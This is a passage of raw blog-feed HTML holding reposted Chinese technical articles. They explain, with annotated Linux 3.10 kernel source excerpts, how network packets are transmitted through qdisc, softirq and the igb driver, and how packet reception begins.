class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/sched/sch_generic.c<br>void __qdisc_run(struct Qdisc *q)<br>&#123;<br> int quota = weight_p;<br><br> //循环从队列取出一个 skb 并发送<br> while (qdisc_restart(q)) &#123;<br>  <br>  // 如果发生下面情况之一，则延后处理：<br>  // 1. quota 用尽<br>  // 2. 其他进程需要 CPU<br>  if (--quota &lt;= 0 || need_resched()) &#123;<br>   //将触发一次 NET_TX_SOFTIRQ 类型 softirq<br>   __netif_schedule(q);<br>   break;<br>  &#125;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，我们看到 while 循环不断地从队列中取出 skb 并进行发送。注意，这个时候其实都占用的是用户进程的系统态时间(sy)。 只有当 quota 用尽或者其它进程需要 CPU 的时候才触发软中断进行发送。</p><p><strong>所以这就是为什么一般服务器上查看 &#x2F;proc&#x2F;softirqs，一般 NET_RX 都要比 NET_TX 大的多的第二个原因</strong>。对于读来说，都是要经过 NET_RX 软中断，而对于发送来说，只有系统态配额用尽才让软中断上。</p><p>我们来把精力在放到 qdisc_restart 上，继续看发送过程。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">static inline int qdisc_restart(struct Qdisc *q)<br>&#123;<br> //从 qdisc 中取出要发送的 skb<br> skb = dequeue_skb(q);<br> ...<br><br> return sch_direct_xmit(skb, q, dev, txq, root_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>qdisc_restart 从队列中取出一个 skb，并调用 sch_direct_xmit 继续发送。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/sched/sch_generic.c<br>int sch_direct_xmit(struct sk_buff *skb, struct Qdisc *q,<br>   struct net_device *dev, struct netdev_queue *txq,<br>   spinlock_t *root_lock)<br>&#123;<br> //调用驱动程序来发送数据<br> ret = dev_hard_start_xmit(skb, dev, txq);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-6-软中断调度"><a href="#4-6-软中断调度" class="headerlink" title="4.6 软中断调度"></a><strong>4.6 软中断调度</strong></h3><p>在 4.5 咱们看到了如果系统态 CPU 发送网络包不够用的时候，会调用 __netif_schedule 触发一个软中断。该函数会进入到 __netif_reschedule，由它来实际发出 NET_TX_SOFTIRQ 类型软中断。</p><p>软中断是由内核线程来运行的，该线程会进入到 net_tx_action 函数，在该函数中能获取到发送队列，并也最终调用到驱动程序里的入口函数 dev_hard_start_xmit。</p><p><img src="https://pic2.zhimg.com/80/v2-7b7da5c8cebe7a05ef2fddc3b98d7ec5_1440w.webp" alt="img"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/dev.c<br>static inline void __netif_reschedule(struct Qdisc *q)<br>&#123;<br> sd = &amp;__get_cpu_var(softnet_data);<br> q-&gt;next_sched = NULL;<br> *sd-&gt;output_queue_tailp = q;<br> sd-&gt;output_queue_tailp = &amp;q-&gt;next_sched;<br><br> ......<br> raise_softirq_irqoff(NET_TX_SOFTIRQ);<br>&#125;<br></code></pre></td></tr></table></figure><p>在该函数里在软中断能访问到的 softnet_data 里设置了要发送的数据队列，添加到了 output_queue 里了。紧接着触发了 NET_TX_SOFTIRQ 类型的软中断。（T 代表 transmit 传输）</p><p>软中断的入口代码我这里也不详细扒了，感兴趣的同学参考**<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/GoYDsfy9m0wRoXi_NCfCmg">《图解Linux网络包接收过程》</a>**一文中的 3.2 小节 - ksoftirqd内核线程处理软中断。</p><p>我们直接从 NET_TX_SOFTIRQ softirq 注册的回调函数 net_tx_action讲起。用户态进程触发完软中断之后，会有一个软中断内核线程会执行到 net_tx_action。</p><p><strong>牢记，这以后发送数据消耗的 CPU 就都显示在 si 这里了，不会消耗用户进程的系统时间了</strong>。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/dev.c<br>static void net_tx_action(struct softirq_action *h)<br>&#123;<br> //通过 softnet_data 获取发送队列<br> struct softnet_data *sd = &amp;__get_cpu_var(softnet_data);<br><br> // 如果 output queue 上有 qdisc<br> if (sd-&gt;output_queue) &#123;<br><br>  // 将 head 指向第一个 qdisc<br>  head = sd-&gt;output_queue;<br><br>  //遍历 qdsics 列表<br>  while (head) &#123;<br>   struct Qdisc *q = head;<br>   head = head-&gt;next_sched;<br><br>   //发送数据<br>   qdisc_run(q);<br>  &#125;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>软中断这里会获取 softnet_data。前面我们看到进程内核态在调用 __netif_reschedule 的时候把发送队列写到 softnet_data 的 output_queue 里了。 软中断循环遍历 sd-&gt;output_queue 发送数据帧。</p><p>来看 qdisc_run，它和进程用户态一样，也会调用到 __qdisc_run。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/net/pkt_sched.h<br>static inline void qdisc_run(struct Qdisc *q)<br>&#123;<br> if (qdisc_run_begin(q))<br>  __qdisc_run(q);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后一样就是进入 qdisc_restart &#x3D;&gt; sch_direct_xmit，直到驱动程序函数 dev_hard_start_xmit。</p><h3 id="4-7-igb-网卡驱动发送"><a href="#4-7-igb-网卡驱动发送" class="headerlink" title="4.7 igb 网卡驱动发送"></a><strong>4.7 igb 网卡驱动发送</strong></h3><p>我们前面看到，无论是对于用户进程的内核态，还是对于软中断上下文，都会调用到网络设备子系统中的 dev_hard_start_xmit 函数。在这个函数中，会调用到驱动里的发送函数 igb_xmit_frame。</p><p>在驱动函数里，将 skb 会挂到 RingBuffer上，驱动调用完毕后，数据包将真正从网卡发送出去。</p><p><img src="https://pic1.zhimg.com/80/v2-dd72dd5d2ddcaa38bcde752bb5d073c4_1440w.webp" alt="img"></p><p>我们来看看实际的源码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/dev.c<br>int dev_hard_start_xmit(struct sk_buff *skb, struct net_device *dev,<br>   struct netdev_queue *txq)<br>&#123;<br> //获取设备的回调函数集合 ops<br> const struct net_device_ops *ops = dev-&gt;netdev_ops;<br><br> //获取设备支持的功能列表<br> features = netif_skb_features(skb);<br><br> //调用驱动的 ops 里面的发送回调函数 ndo_start_xmit 将数据包传给网卡设备<br> skb_len = skb-&gt;len;<br> rc = ops-&gt;ndo_start_xmit(skb, dev);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 ndo_start_xmit 是网卡驱动要实现的一个函数，是在 net_device_ops 中定义的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/linux/netdevice.h<br>struct net_device_ops &#123;<br> netdev_tx_t  (*ndo_start_xmit) (struct sk_buff *skb,<br>         struct net_device *dev);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在 igb 网卡驱动源码中，我们找到了。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static const struct net_device_ops igb_netdev_ops = &#123;<br> .ndo_open  = igb_open,<br> .ndo_stop  = igb_close,<br> .ndo_start_xmit  = igb_xmit_frame, <br> ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>也就是说，对于网络设备层定义的 ndo_start_xmit， igb 的实现函数是 igb_xmit_frame。这个函数是在网卡驱动初始化的时候被赋值的。具体初始化过程参见**<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/GoYDsfy9m0wRoXi_NCfCmg">《图解Linux网络包接收过程》</a>**一文中的 2.4 节，网卡驱动初始化。</p><p>所以在上面网络设备层调用 ops-&gt;ndo_start_xmit 的时候，会实际上进入 igb_xmit_frame 这个函数中。我们进入这个函数来看看驱动程序是如何工作的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static netdev_tx_t igb_xmit_frame(struct sk_buff *skb,<br>      struct net_device *netdev)<br>&#123;<br> ......<br> return igb_xmit_frame_ring(skb, igb_tx_queue_mapping(adapter, skb));<br>&#125;<br><br>netdev_tx_t igb_xmit_frame_ring(struct sk_buff *skb,<br>    struct igb_ring *tx_ring)<br>&#123;<br> //获取TX Queue 中下一个可用缓冲区信息<br> first = &amp;tx_ring-&gt;tx_buffer_info[tx_ring-&gt;next_to_use];<br> first-&gt;skb = skb;<br> first-&gt;bytecount = skb-&gt;len;<br> first-&gt;gso_segs = 1;<br><br> //igb_tx_map 函数准备给设备发送的数据。<br> igb_tx_map(tx_ring, first, hdr_len);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里从网卡的发送队列的 RingBuffer 中取下来一个元素，并将 skb 挂到元素上。</p><p><img src="https://pic1.zhimg.com/80/v2-53210da030eea44896489582bbbc13f0_1440w.webp" alt="img"></p><p>igb_tx_map 函数处理将 skb 数据映射到网卡可访问的内存 DMA 区域。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static void igb_tx_map(struct igb_ring *tx_ring,<br>      struct igb_tx_buffer *first,<br>      const u8 hdr_len)<br>&#123;<br> //获取下一个可用描述符指针<br> tx_desc = IGB_TX_DESC(tx_ring, i);<br><br> //为 skb-&gt;data 构造内存映射，以允许设备通过 DMA 从 RAM 中读取数据<br> dma = dma_map_single(tx_ring-&gt;dev, skb-&gt;data, size, DMA_TO_DEVICE);<br><br> //遍历该数据包的所有分片,为 skb 的每个分片生成有效映射<br> for (frag = &amp;skb_shinfo(skb)-&gt;frags[0];; frag++) &#123;<br><br>  tx_desc-&gt;read.buffer_addr = cpu_to_le64(dma);<br>  tx_desc-&gt;read.cmd_type_len = ...;<br>  tx_desc-&gt;read.olinfo_status = 0;<br> &#125;<br><br> //设置最后一个descriptor<br> cmd_type |= size | IGB_TXD_DCMD;<br> tx_desc-&gt;read.cmd_type_len = cpu_to_le32(cmd_type);<br><br> /* Force memory writes to complete before letting h/w know there<br>  * are new descriptors to fetch<br>  */<br> wmb();<br>&#125;<br></code></pre></td></tr></table></figure><p>当所有需要的描述符都已建好，且 skb 的所有数据都映射到 DMA 地址后，驱动就会进入到它的最后一步，触发真实的发送。</p><h3 id="4-8-发送完成硬中断"><a href="#4-8-发送完成硬中断" class="headerlink" title="4.8 发送完成硬中断"></a><strong>4.8 发送完成硬中断</strong></h3><p>当数据发送完成以后，其实工作并没有结束。因为内存还没有清理。当发送完成的时候，网卡设备会触发一个硬中断来释放内存。</p><p>在**<a href="https://link.zhihu.com/?target=https://mp.weixin.qq.com/s/GoYDsfy9m0wRoXi_NCfCmg">《图解Linux网络包接收过程》</a>** 一文中的 3.1 和 3.2 小节，我们详细讲述过硬中断和软中断的处理过程。</p><p>在发送硬中断里，会执行 RingBuffer 内存的清理工作，如图。</p><p><img src="https://pic1.zhimg.com/80/v2-4a1721e48e34c50390132f018c5ad1d4_1440w.webp" alt="img"></p><p>再回头看一下硬中断触发软中断的源码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static inline void ____napi_schedule(...)&#123;<br> list_add_tail(&amp;napi-&gt;poll_list, &amp;sd-&gt;poll_list);<br> __raise_softirq_irqoff(NET_RX_SOFTIRQ);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个很有意思的细节，无论硬中断是因为是有数据要接收，还是说发送完成通知，<strong>从硬中断触发的软中断都是 NET_RX_SOFTIRQ</strong>。 这个我们在第一节说过了，这是软中断统计中 RX 要高于 TX 的一个原因。</p><p>好我们接着进入软中断的回调函数 igb_poll。在这个函数里，我们注意到有一行 igb_clean_tx_irq，参见源码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static int igb_poll(struct napi_struct *napi, int budget)<br>&#123;<br> //performs the transmit completion operations<br> if (q_vector-&gt;tx.ring)<br>  clean_complete = igb_clean_tx_irq(q_vector);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来看看当传输完成的时候，igb_clean_tx_irq 都干啥了。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: drivers/net/ethernet/intel/igb/igb_main.c<br>static bool igb_clean_tx_irq(struct igb_q_vector *q_vector)<br>&#123;<br> //free the skb<br> dev_kfree_skb_any(tx_buffer-&gt;skb);<br><br> //clear tx_buffer data<br> tx_buffer-&gt;skb = NULL;<br> dma_unmap_len_set(tx_buffer, len, 0);<br><br> // clear last DMA location and unmap remaining buffers */<br> while (tx_desc != eop_desc) &#123;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>无非就是清理了 skb，解除了 DMA 映射等等。 到了这一步，传输才算是基本完成了。</p><p>为啥我说是基本完成，而不是全部完成了呢？因为传输层需要保证可靠性，所以 skb 其实还没有删除。它得等收到对方的 ACK 之后才会真正删除，那个时候才算是彻底的发送完毕。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>用一张图总结一下整个发送过程</p><p><img src="https://pic4.zhimg.com/80/v2-ecb73e1531032fea52e21644f2aa1413_1440w.webp" alt="img"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p><strong>1.我们在监控内核发送数据消耗的 CPU 时，是应该看 sy 还是 si ？</strong></p><p>在网络包的发送过程中，用户进程（在内核态）完成了绝大部分的工作，甚至连调用驱动的事情都干了。 只有当内核态进程被切走前才会发起软中断。 发送过程中，绝大部分（90%）以上的开销都是在用户进程内核态消耗掉的。</p><p>只有一少部分情况下才会触发软中断（NET_TX 类型），由软中断 ksoftirqd 内核进程来发送。</p><p>所以，在监控网络 IO 对服务器造成的 CPU 开销的时候，不能仅仅只看 si，而是应该把 si、sy 都考虑进来。</p><p><strong>2. 在服务器上查看 &#x2F;proc&#x2F;softirqs，为什么 NET_RX 要比 NET_TX 大的多的多？</strong></p><p>之前我认为 NET_RX 是读取，NET_TX 是传输。对于一个既收取用户请求，又给用户返回的 Server 来说。 这两块的数字应该差不多才对，至少不会有数量级的差异。但事实上，飞哥手头的一台服务器是这样的：</p><p><img src="https://pic1.zhimg.com/80/v2-519963353aadc56140fc233c7bdf6db0_1440w.webp" alt="img"></p><p>经过今天的源码分析，发现这个问题的原因有两个。</p><p>第一个原因是当数据发送完成以后，通过硬中断的方式来通知驱动发送完毕。但是硬中断无论是有数据接收，还是对于发送完毕，触发的软中断都是 NET_RX_SOFTIRQ，而并不是 NET_TX_SOFTIRQ。</p><p>第二个原因是对于读来说，都是要经过 NET_RX 软中断的，都走 ksoftirqd 内核进程。而对于发送来说，绝大部分工作都是在用户进程内核态处理了，只有系统态配额用尽才会发出 NET_TX，让软中断上。</p><p>综上两个原因，那么在机器上查看 NET_RX 比 NET_TX 大的多就不难理解了。</p><p><strong>3.发送网络数据的时候都涉及到哪些内存拷贝操作？</strong></p><p>这里的内存拷贝，我们只特指待发送数据的内存拷贝。</p><p>第一次拷贝操作是内核申请完 skb 之后，这时候会将用户传递进来的 buffer 里的数据内容都拷贝到 skb 中。如果要发送的数据量比较大的话，这个拷贝操作开销还是不小的。</p><p>第二次拷贝操作是从传输层进入网络层的时候，每一个 skb 都会被克隆一个新的副本出来。网络层以及下面的驱动、软中断等组件在发送完成的时候会将这个副本删除。传输层保存着原始的 skb，在当网络对方没有 ack 的时候，还可以重新发送，以实现 TCP 中要求的可靠传输。</p><p>第三次拷贝不是必须的，只有当 IP 层发现 skb 大于 MTU 时才需要进行。会再申请额外的 skb，并将原来的 skb 拷贝为多个小的 skb。</p><blockquote><p>这里插入个题外话，大家在网络性能优化中经常听到的零拷贝，我觉得这有点点夸张的成分。TCP 为了保证可靠性，第二次的拷贝根本就没法省。如果包再大于 MTU 的话，分片时的拷贝同样也避免不了。</p></blockquote><p>看到这里，相信内核发送数据包对于你来说，已经不再是一个完全不懂的黑盒了。本文哪怕你只看懂十分之一，你也已经掌握了这个黑盒的打开方式。这在你将来优化网络性能时你就会知道从哪儿下手了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考</strong>链接</h2><ul><li><a href="https://link.zhihu.com/?target=https://blog.packagecloud.io/eng/2017/02/06/monitoring-tuning-linux-networking-stack-sending-data/">Monitoring and Tuning the Linux Networking Stack: Sending Data</a></li><li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_34258344/article/details/108956205">上述文章的一个翻译版本,只翻译了一半</a></li><li><a href="https://link.zhihu.com/?target=https://ggaaooppeenngg.github.io/zh-CN/2017/08/07/neighboring-subsystem-%E6%B5%85%E6%9E%90/">翻译的是另外一半，neighboring subsystem 浅析</a></li><li><a href="https://link.zhihu.com/?target=http://kerneltravel.net/blog/2020/network_ljr14/">LINUX内核网络数据包发送（四）——LINUX NETDEVICE 子系统</a></li><li><a href="https://link.zhihu.com/?target=http://kerneltravel.net/blog/2020/network_ljr13/">LINUX内核网络数据包发送（三）——IP协议层分析</a></li><li><a href="https://link.zhihu.com/?target=http://kerneltravel.net/blog/2020/dma_bjq/">LINUX网络子系统中DMA机制的实现</a></li><li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/weixin_43722423/article/details/103276437">Linux socket 数据发送过程深入分析</a></li><li><a href="https://link.zhihu.com/?target=https://man7.org/linux/man-pages/man2/send.2.html">send 函数</a></li><li><a href="https://link.zhihu.com/?target=https://ivanzz1001.github.io/records/post/linux/2017/11/04/linux-msghdr">Linux msghdr结构讲解</a></li><li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/zhangskd/article/details/48207553">TCP的发送系列 — tcp_sendmsg()的实现（一）</a></li><li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/myguaiguai/p/12069485.html">参考：send和recv背后数据的收发过程</a></li><li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/luckywang1103/article/details/51422664">linux net子系统-协议层（传输层与网络层)</a></li><li><a href="https://link.zhihu.com/?target=http://kerneltravel.net/blog/2020/network_ljr_no1/">LINUX内核网络（一）——初探内核网络</a></li><li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/ouyangxibao/articles/12577177.html">XPS选择发送队列描述详细</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 网络包接收过程</title>
    <link href="/2022/11/25/Linux%E7%BD%91%E7%BB%9C%E5%8C%85%E6%8E%A5%E6%94%B6%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/11/25/Linux%E7%BD%91%E7%BB%9C%E5%8C%85%E6%8E%A5%E6%94%B6%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                                   Linux网络包接收过程<blockquote><p>转载自张彦飞大佬的<a href="https://zhuanlan.zhihu.com/p/373060740">图解Linux网络包接收过程</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> serverSocketFd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>    bind(serverSocketFd, ...);<br><br>    <span class="hljs-type">char</span> buff[BUFFSIZE];<br>    <span class="hljs-type">int</span> readCount = recvfrom(serverSocketFd, buff, BUFFSIZE, <span class="hljs-number">0</span>, ...);<br>    buff[readCount] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Receive from client:%s\n&quot;</span>, buff);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码是一段udp server接收收据的逻辑。 当在开发视角看的时候，只要客户端有对应的数据发送过来，服务器端执行<code>recv_from</code>后就能收到它，并把它打印出来。我们现在想知道的是，当网络包达到网卡，直到我们的<code>recvfrom</code>收到数据，这中间，究竟都发生过什么？</p><p>通过本文，将深入理解Linux网络系统内部是如何实现的，以及各个部分之间如何交互。相信这对你的工作将会有非常大的帮助。本文基于Linux 3.10，源代码参见<a href="https://link.zhihu.com/?target=https://mirrors.edge.kernel.org/pub/linux/kernel/v3.x/">https://mirrors.edge.kernel.org/pub/linux/kernel/v3.x/</a>，网卡驱动采用Intel的igb网卡举例。</p><h2 id="一、Linux网络收包总览"><a href="#一、Linux网络收包总览" class="headerlink" title="一、Linux网络收包总览"></a>一、Linux网络收包总览</h2><p>在TCP&#x2F;IP网络分层模型里，整个协议栈被分成了物理层、链路层、网络层，传输层和应用层。物理层对应的是网卡和网线，应用层对应的是我们常见的Nginx，FTP等等各种应用。Linux实现的是链路层、网络层和传输层这三层。</p><p>在Linux内核实现中，链路层协议靠网卡驱动来实现，内核协议栈来实现网络层和传输层。内核对更上层的应用层提供socket接口来供用户进程访问。我们用Linux的视角来看到的TCP&#x2F;IP网络分层模型应该是下面这个样子的。</p><p><img src="https://pic1.zhimg.com/80/v2-87d5a10d57841c7f6662706fb02da2a8_1440w.webp" alt="img"></p><p>​                                                                                                     <strong>图1 Linux视角的网络协议栈</strong></p><p>在Linux的源代码中，网络设备驱动对应的逻辑位于<code>driver/net/ethernet</code>, 其中intel系列网卡的驱动在<code>driver/net/ethernet/intel</code>目录下。协议栈模块代码位于<code>kernel</code>和<code>net</code>目录。</p><p>内核和网络设备驱动是通过中断的方式来处理的。当设备上有数据到达的时候，会给CPU的相关引脚上触发一个电压变化，以通知CPU来处理数据。对于网络模块来说，由于处理过程比较复杂和耗时，如果在中断函数中完成所有的处理，将会导致中断处理函数（优先级过高）将过度占据CPU，将导致CPU无法响应其它设备，例如鼠标和键盘的消息。因此Linux中断处理函数是分上半部和下半部的。上半部是只进行最简单的工作，快速处理然后释放CPU，接着CPU就可以允许其它中断进来。剩下将绝大部分的工作都放到下半部中，可以慢慢从容处理。2.4以后的内核版本采用的下半部实现方式是软中断，由ksoftirqd内核线程全权处理。和硬中断不同的是，硬中断是通过给CPU物理引脚施加电压变化，而软中断是通过给内存中的一个变量的二进制值以通知软中断处理程序。</p><p>好了，大概了解了网卡驱动、硬中断、软中断和ksoftirqd线程之后，我们在这几个概念的基础上给出一个内核收包的路径示意:</p><p><img src="https://pic2.zhimg.com/80/v2-eac465cf5eb96242a7429e0bc9af7765_1440w.webp" alt="img"></p><p>​                                                                                                             <strong>图2 Linux内核网络收包总览</strong></p><p>当网卡上收到数据以后，首先会以DMA的方式把网卡上收到的帧写到内存里。再向CPU发起一个中断，以通知CPU有数据到达。当CPU收到中断请求后，会去调用网络驱动注册的中断处理函数。 网卡的中断处理函数并不做过多工作，发出软中断请求，然后尽快释放CPU。ksoftirqd检测到有软中断请求到达，调用poll开始轮询收包，收到后交由各级协议栈处理。对于UDP包来说，会被放到用户socket的接收队列中。</p><p>从上面这张图中已经从整体上把握到了Linux对数据包的处理过程。但是要想了解更多网络模块工作的细节，我们还得往下看。</p><h2 id="二、Linux启动"><a href="#二、Linux启动" class="headerlink" title="二、Linux启动"></a>二、Linux启动</h2><p>Linux驱动，内核协议栈等等模块在具备接收网卡数据包之前，要做很多的准备工作才行。比如要提前创建好ksoftirqd内核线程，要注册好各个协议对应的处理函数，网络设备子系统要提前初始化好，网卡要启动好。只有这些都Ready之后，我们才能真正开始接收数据包。那么我们现在来看看这些准备工作都是怎么做的。</p><h2 id="2-1-创建ksoftirqd内核线程"><a href="#2-1-创建ksoftirqd内核线程" class="headerlink" title="2.1 创建ksoftirqd内核线程"></a>2.1 创建ksoftirqd内核线程</h2><p>Linux的软中断都是在专门的内核线程（ksoftirqd）中进行的，因此我们非常有必要看一下这些进程是怎么初始化的，这样我们才能在后面更准确地了解收包过程。该进程数量不是1个，而是N个，其中N等于你的机器的核数。</p><p>系统初始化的时候在kernel&#x2F;smpboot.c中调用了smpboot_register_percpu_thread， 该函数进一步会执行到spawn_ksoftirqd（位于kernel&#x2F;softirq.c）来创建出softirqd进程。</p><p><img src="https://pic1.zhimg.com/80/v2-aa6838d02b5b8c01830d8013c03966c8_1440w.webp" alt="img"></p><p>​                                                                                            <strong>图3 创建ksoftirqd内核线程</strong></p><p>相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file: kernel/softirq.c</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">smp_hotplug_thread</span> <span class="hljs-title">softirq_threads</span> =</span> &#123;<br>    .store          = &amp;ksoftirqd,<br>    .thread_should_run  = ksoftirqd_should_run,<br>    .thread_fn      = run_ksoftirqd,<br>    .thread_comm        = <span class="hljs-string">&quot;ksoftirqd/%u&quot;</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">spawn_ksoftirqd</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    register_cpu_notifier(&amp;cpu_nfb);<br><br>    BUG_ON(smpboot_register_percpu_thread(&amp;softirq_threads));<br><br>    <span class="hljs-keyword">return</span> <span 